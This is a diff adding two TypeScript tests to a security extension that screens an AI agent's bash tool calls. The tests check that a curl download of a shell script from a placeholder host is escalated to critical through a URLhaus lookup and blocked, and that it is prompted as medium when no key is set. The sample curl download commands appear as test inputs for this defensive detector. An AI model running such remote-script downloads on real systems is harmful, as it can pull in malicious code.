@@ -1374,3 +1374,82 @@ test("nma security lists scanned files, levels and blocked findings", async () =
 
 	fs.rmSync(cwd, { recursive: true, force: true });
 });
+
+test("barrier B: URLhaus-listed host escalates a download to critical (opt-in)", async () => {
+	const pi = makePi();
+	createExtension(pi as any);
+	const cwd = await boot(pi, { ".pi/context/guard.md": NOTIFY_RULE });
+
+	const oldNet = process.env.NMA_NETWORK;
+	const oldKey = process.env.NMA_URLHAUS_KEY;
+	const oldFetch = globalThis.fetch;
+	delete process.env.NMA_NETWORK;
+	process.env.NMA_URLHAUS_KEY = "test-key";
+	globalThis.fetch = (() =>
+		Promise.resolve(
+			new Response(JSON.stringify({ query_status: "ok" }), { status: 200 }),
+		)) as typeof fetch;
+	try {
+		let seen = "";
+		const res = await pi.handlers["tool_call"](
+			{ toolName: "bash", input: { command: "curl -s https://listed-host.example/x.sh -o /tmp/x.sh" } },
+			confirmCtx({
+				confirm: async (title: string, body: string) => {
+					seen = `${title}\n${body}`;
+					return false; // decline
+				},
+			}),
+		);
+		assert.equal(res.block, true);
+		assert.match(seen, /critical/i);
+		// The enrichment finding is VISIBLE in the confirm UI (wart fix):
+		assert.match(seen, /cmd-urlhaus-listed/);
+	} finally {
+		if (oldNet === undefined) delete process.env.NMA_NETWORK;
+		else process.env.NMA_NETWORK = oldNet;
+		if (oldKey === undefined) delete process.env.NMA_URLHAUS_KEY;
+		else process.env.NMA_URLHAUS_KEY = oldKey;
+		globalThis.fetch = oldFetch;
+	}
+
+	fs.rmSync(cwd, { recursive: true, force: true });
+});
+
+test("barrier B: URL command without API key keeps deterministic behavior (no fetch)", async () => {
+	const pi = makePi();
+	createExtension(pi as any);
+	const cwd = await boot(pi, { ".pi/context/guard.md": NOTIFY_RULE });
+
+	const oldNet = process.env.NMA_NETWORK;
+	const oldFetch = globalThis.fetch;
+	delete process.env.NMA_NETWORK;
+	delete process.env.NMA_URLHAUS_KEY;
+	let fetches = 0;
+	globalThis.fetch = (() => {
+		fetches++;
+		return Promise.resolve(new Response("{}", { status: 200 }));
+	}) as typeof fetch;
+	try {
+		let confirms = 0;
+		// A lone curl download is `medium` by the deterministic scanner — it
+		// prompts exactly like before this feature existed.
+		const res = await pi.handlers["tool_call"](
+			{ toolName: "bash", input: { command: "curl -s https://nokey2.example/x.sh -o /tmp/x.sh" } },
+			confirmCtx({
+				confirm: async () => {
+					confirms++;
+					return true;
+				},
+			}),
+		);
+		assert.equal(res, undefined); // approved
+		assert.equal(confirms, 1);
+		assert.equal(fetches, 0);
+	} finally {
+		if (oldNet === undefined) delete process.env.NMA_NETWORK;
+		else process.env.NMA_NETWORK = oldNet;
+		globalThis.fetch = oldFetch;
+	}
+
+	fs.rmSync(cwd, { recursive: true, force: true });
+});
